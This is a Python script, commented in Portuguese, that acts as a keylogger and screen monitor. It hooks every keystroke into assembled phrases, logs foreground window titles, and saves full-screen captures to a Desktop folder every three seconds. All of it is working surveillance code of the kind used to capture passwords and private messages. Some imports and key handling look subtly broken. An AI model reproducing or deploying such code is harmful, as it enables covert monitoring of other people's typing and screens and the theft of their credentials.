import keyboard
import time
import win32gui
import os
import pygetwindow as gw
import ImageGrab

# Inicializa variáveis
frase = ""
tempo_inicio = time.time()
ultima_tecla = ""
tempo_ultima_tecla = 0

def reset_tempo():
    global tempo_inicio
    tempo_inicio = time.time()

def on_keyboard_event(e):
    global frase, ultima_tecla, tempo_ultima_tecla
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == "space":
            frase += " "
        elif e.name == "delete":
            if frase:
                frase = frase[:-1]  # Remove o último caractere
        elif e.name == ultima_tecla and time.time() - tempo_ultima_tecla < 1.5:
            return
        elif e.name not in ["shift", "backspace", "ctrl", "alt"]:
            frase += e.name
        ultima_tecla = e.name
        tempo_ultima_tecla = time.time()
        reset_tempo()

keyboard.hook(on_keyboard_event)

def capturar_tela():
    screenshot = ImageGrab.grab(all_screens=True)
    return screenshot

try:
    janela_ativa = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    while True:
        if time.time() - tempo_inicio >= 2 and frase:
            if frase != "":  # Verifica se a frase não está vazia
                print(f'Frase finalizada: {frase}')
            frase = ""
            reset_tempo()

        nova_janela = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if nova_janela != janela_ativa:
            if nova_janela:
                print(f'Janela aberta: {nova_janela}')
            else:
                print(f'Janela fechada: {janela_ativa}')
            janela_ativa = nova_janela
            reset_tempo()

        screenshot = capturar_tela()
        if screenshot:
            nome_arquivo = f"captura_{int(time.time())}.png"
            caminho = os.path.join(os.path.expanduser("~"), "Desktop", "capturas", nome_arquivo)
            os.makedirs(os.path.dirname(caminho), exist_ok=True)
            screenshot.save(caminho)

        time.sleep(3)  # Aguarda 3 segundos antes da próxima captura

except KeyboardInterrupt:
    print("Programa encerrado pelo usuário.")
except Exception as e:
    print(f"Erro: {e}")
finally:
    os.system('cls' if os.name == 'nt' else 'clear')
